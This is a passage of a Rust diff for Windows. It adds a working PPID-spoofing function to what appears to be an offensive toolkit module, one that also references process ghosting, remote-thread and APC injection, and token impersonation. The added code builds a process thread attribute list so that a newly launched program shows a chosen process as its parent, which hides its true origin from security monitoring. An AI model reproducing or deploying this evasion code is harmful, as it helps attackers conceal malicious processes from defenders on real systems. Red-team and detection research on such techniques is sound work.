@@ -22,12 +22,14 @@ use windows::Win32::System::Memory::{
     PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY,
 };
 use windows::Win32::System::Threading::{
-    CreateProcessAsUserW, CreateProcessW, CreateRemoteThread, GetCurrentProcess, GetProcessId,
-    OpenProcess, OpenThread, OpenProcessToken, QueueUserAPC, ResumeThread, SuspendThread,
-    TerminateProcess, WaitForSingleObject, CREATE_SUSPENDED, PROCESS_ALL_ACCESS,
-    PROCESS_CREATE_THREAD, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION,
-    PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
-    STARTUPINFOW, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
+    CreateProcessAsUserW, CreateProcessW, CreateRemoteThread, DeleteProcThreadAttributeList,
+    GetCurrentProcess, GetProcessId, InitializeProcThreadAttributeList, OpenProcess, OpenThread,
+    OpenProcessToken, QueueUserAPC, ResumeThread, SuspendThread, TerminateProcess,
+    UpdateProcThreadAttribute, WaitForSingleObject, CREATE_SUSPENDED, EXTENDED_STARTUPINFO_PRESENT,
+    LPPROC_THREAD_ATTRIBUTE_LIST, PROCESS_ALL_ACCESS, PROCESS_CREATE_THREAD,
+    PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION, PROCESS_QUERY_LIMITED_INFORMATION,
+    PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOEXW, STARTUPINFOW,
+    THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
 };
 use windows::Win32::Security::{
     AdjustTokenPrivileges, DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
@@ -75,6 +77,7 @@ pub enum MiscError {
     GhostSectionFailed,
     GhostNtCreateProcessFailed,
     GhostSetupFailed(String),
+    PPidSpoofFailed(String),
 }
 
 impl fmt::Display for MiscError {
@@ -127,6 +130,7 @@ impl fmt::Display for MiscError {
             MiscError::GhostSectionFailed => write!(f, "Failed to create image section from ghost file"),
             MiscError::GhostNtCreateProcessFailed => write!(f, "NtCreateProcessEx failed"),
             MiscError::GhostSetupFailed(msg) => write!(f, "Ghost process setup failed: {}", msg),
+            MiscError::PPidSpoofFailed(msg) => write!(f, "PPID spoofing failed: {}", msg),
         }
     }
 }
@@ -1881,6 +1885,140 @@ pub fn create_process(exe_path: &str, args: &str, suspended: bool) -> Result<(u3
         let tid = process_info.dwThreadId;
 
         // Close handles (we don't need them)
+        let _ = CloseHandle(process_info.hThread);
+        let _ = CloseHandle(process_info.hProcess);
+
+        Ok((pid, tid))
+    }
+}
+
+/// Create a process with a spoofed parent PID (PPID Spoofing).
+///
+/// Uses `InitializeProcThreadAttributeList` + `UpdateProcThreadAttribute` with
+/// `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to make the new process appear as a child
+/// of the specified parent process, then calls `CreateProcessW` with
+/// `EXTENDED_STARTUPINFO_PRESENT`.
+///
+/// # Arguments
+/// * `parent_pid` - PID of the process to use as the spoofed parent
+/// * `exe_path` - Path to the executable to launch
+/// * `args` - Command line arguments (can be empty)
+/// * `suspended` - Whether to create the process in a suspended state
+pub fn create_ppid_spoofed_process(
+    parent_pid: u32,
+    exe_path: &str,
+    args: &str,
+    suspended: bool,
+) -> Result<(u32, u32), MiscError> {
+    const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
+
+    // Validate executable exists
+    if !Path::new(exe_path).exists() {
+        return Err(MiscError::FileNotFound(exe_path.to_string()));
+    }
+
+    // Build command line: "exe_path" args
+    let cmd_line = if args.is_empty() {
+        format!("\"{}\"", exe_path)
+    } else {
+        format!("\"{}\" {}", exe_path, args)
+    };
+
+    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();
+
+    unsafe {
+        // Open handle to the parent process
+        let h_parent = OpenProcess(PROCESS_ALL_ACCESS, false, parent_pid)
+            .map_err(|_| MiscError::OpenProcessFailed(parent_pid))?;
+
+        // First call to get required attribute list size
+        let mut attr_size: usize = 0;
+        let _ = InitializeProcThreadAttributeList(
+            LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
+            1,
+            0,
+            &mut attr_size,
+        );
+
+        if attr_size == 0 {
+            let _ = CloseHandle(h_parent);
+            return Err(MiscError::PPidSpoofFailed(
+                "InitializeProcThreadAttributeList returned zero size".to_string(),
+            ));
+        }
+
+        // Allocate buffer for attribute list
+        let mut attr_buf = vec![0u8; attr_size];
+        let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_buf.as_mut_ptr() as *mut _);
+
+        // Initialize the attribute list
+        if InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size).is_err() {
+            let _ = CloseHandle(h_parent);
+            return Err(MiscError::PPidSpoofFailed(
+                "InitializeProcThreadAttributeList failed".to_string(),
+            ));
+        }
+
+        // Set the parent process attribute
+        let h_parent_raw = h_parent.0 as *mut std::ffi::c_void;
+        if UpdateProcThreadAttribute(
+            attr_list,
+            0,
+            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+            Some(&h_parent_raw as *const _ as *const std::ffi::c_void),
+            std::mem::size_of::<*mut std::ffi::c_void>(),
+            None,
+            None,
+        )
+        .is_err()
+        {
+            DeleteProcThreadAttributeList(attr_list);
+            let _ = CloseHandle(h_parent);
+            return Err(MiscError::PPidSpoofFailed(
+                "UpdateProcThreadAttribute failed".to_string(),
+            ));
+        }
+
+        // Set up STARTUPINFOEXW with the attribute list
+        let mut startup_info_ex: STARTUPINFOEXW = std::mem::zeroed();
+        startup_info_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
+        startup_info_ex.lpAttributeList = attr_list;
+
+        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
+
+        let mut creation_flags = EXTENDED_STARTUPINFO_PRESENT;
+        if suspended {
+            creation_flags |= CREATE_SUSPENDED;
+        }
+
+        let result = CreateProcessW(
+            None,
+            windows::core::PWSTR(cmd_wide.as_mut_ptr()),
+            None,
+            None,
+            false,
+            creation_flags,
+            None,
+            None,
+            &startup_info_ex.StartupInfo,
+            &mut process_info,
+        );
+
+        // Clean up attribute list and parent handle
+        DeleteProcThreadAttributeList(attr_list);
+        let _ = CloseHandle(h_parent);
+
+        if result.is_err() {
+            return Err(MiscError::CreateProcessFailed(format!(
+                "CreateProcessW with PPID spoofing failed for {}",
+                exe_path
+            )));
+        }
+
+        let pid = process_info.dwProcessId;
+        let tid = process_info.dwThreadId;
+
+        // Close handles
         let _ = CloseHandle(process_info.hThread);
         let _ = CloseHandle(process_info.hProcess);
 
